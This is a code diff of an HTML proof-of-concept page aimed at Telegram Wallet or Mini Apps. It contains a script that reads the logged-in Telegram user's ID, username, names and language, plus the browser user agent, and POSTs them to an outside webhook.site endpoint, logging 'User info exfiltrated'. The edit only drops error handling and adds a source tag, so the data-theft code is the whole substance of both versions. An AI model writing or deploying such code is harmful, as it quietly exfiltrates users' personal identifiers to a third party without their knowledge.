@@ -9,30 +9,28 @@
   <p>This PoC opens Telegram Wallet and injects wallet logic using postMessage.</p>
 
   <script>
-try {
-  window.Telegram.WebApp.ready();
+window.Telegram.WebApp.ready();
 
-  const user = window.Telegram.WebApp.initDataUnsafe?.user;
-  if (user) {
-    fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        telegram_id: user.id,
-        username: user.username,
-        first_name: user.first_name,
-        last_name: user.last_name,
-        lang: user.language_code,
-        ua: navigator.userAgent
-      })
-    });
-    console.log("✅ User info exfiltrated");
-  } else {
-    console.warn("⚠️ No Telegram user found in initDataUnsafe");
-  }
-} catch (e) {
-  console.error("Error accessing Telegram WebApp context:", e);
+const user = window.Telegram.WebApp.initDataUnsafe?.user;
+if (user) {
+  fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      telegram_id: user.id,
+      username: user.username,
+      first_name: user.first_name,
+      last_name: user.last_name,
+      lang: user.language_code,
+      ua: navigator.userAgent,
+      source: "Telegram Bot WebApp"
+    })
+  });
+  console.log("✅ User info exfiltrated");
+} else {
+  console.warn("⚠️ No user info found");
 }
+
   </script>
 </body>
 </html>
